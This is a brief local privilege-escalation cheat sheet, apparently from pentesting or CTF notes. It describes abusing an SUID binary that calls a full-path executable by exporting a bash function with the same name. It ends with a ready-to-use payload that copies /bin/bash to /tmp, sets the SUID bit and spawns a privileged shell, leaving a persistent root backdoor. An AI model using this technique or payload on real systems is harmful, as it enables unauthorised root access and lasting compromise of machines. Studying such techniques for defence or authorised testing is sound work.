# Use this when there is an SUID binary that calls another executable with a full path.
# this can be abused by declaring a function (in bash) with the same name, exporting it, and calling the SUID binary from the same directory.

# 1. Declare the function at the command line
# 2. Make the current directory first on PATH just to be safe
# 3. export -f /function/path/name
# 4. execute the SUID binary that calls the malicious function

function /usr/sbin/service() { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }

